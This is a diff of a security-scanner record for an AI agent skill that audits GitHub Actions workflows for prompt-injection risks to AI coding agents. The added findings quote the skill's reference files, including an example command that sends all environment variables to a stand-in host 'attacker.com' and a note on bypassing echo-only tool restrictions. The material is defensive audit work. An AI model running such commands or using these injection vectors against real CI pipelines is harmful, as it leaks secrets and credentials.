@@ -5,23 +5,70 @@
   "path": "skills/agentic-actions-auditor",
   "name": "agentic-actions-auditor",
   "description": "Audits GitHub Actions workflows for security vulnerabilities in AI agent integrations including Claude Code Action, Gemini CLI, OpenAI Codex, and GitHub AI Inference. Detects attack vectors where attacker-controlled input reaches AI agents running in CI/CD pipelines, including env var intermediary patterns, direct expression injection, dangerous sandbox configurations, and wildcard user allowlists. Use when reviewing workflow files that invoke AI coding agents, auditing CI/CD pipeline security for prompt injection risks, or evaluating agentic action configurations.",
-  "stars": 16,
+  "stars": 17,
   "category": "devops",
   "commit": "2a76bf42ce5c860adf8d0f3fcf3f6804109ac65b",
   "contentHash": "93f00ac1cd0d0c60d3bbb9379abbe92438f10c49c3dc5bd2629386938c4489d1",
   "repoCreatedAt": "2026-03-25T00:16:34Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-12T10:25:14.233Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 51,
+        "excerpt": "Tool restrictions give a false sense of security. \"Only allow echo\" sounds safe -- echo just prints text. But `echo $(env)` dumps all environment variables incl",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 74,
+        "excerpt": "- `echo $(curl -s attacker.com/exfil?data=$(env | base64))` -- exfiltrate all env vars",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 74,
+        "excerpt": "- `echo $(curl -s attacker.com/exfil?data=$(env | base64))` -- exfiltrate all env vars",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 79,
+        "excerpt": "- **Sandboxed execution models** -- if the command is NOT run through a shell (e.g., direct exec without shell interpretation), subshell expansion does not appl",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/agentic-actions-auditor/references/vector-g-eval-of-ai-output.md",
+        "line": 39,
+        "excerpt": "3. **Python/Node steps** that use `json.loads()` on AI output and then format values into a shell command (string interpolation into `subprocess.run()` or `os.s",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "downloads-code": 1,
+      "reads-secrets": 1,
+      "network": 1,
+      "shell": 2
+    },
+    "score": 69,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 4,
-    "filesSkipped": 9
+    "filesScanned": 13,
+    "filesSkipped": 0
   },
   "history": [
     {
